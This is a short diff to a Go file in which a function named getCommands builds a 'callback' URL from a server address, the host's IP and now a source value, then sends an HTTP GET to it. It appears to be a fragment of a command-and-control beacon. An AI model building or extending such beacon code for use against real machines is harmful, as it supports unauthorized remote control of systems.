@@ -33,7 +33,7 @@ func getIP() string {
 
 func getCommands() {
 	ip := getIP()
-	url := "http://" + serv + "/api/callback/" + ip
+	url := "http://" + serv + "/api/callback/" + ip + "/" + src
 	r, err := http.Get(url)
 	if err != nil {
 		panic(err)
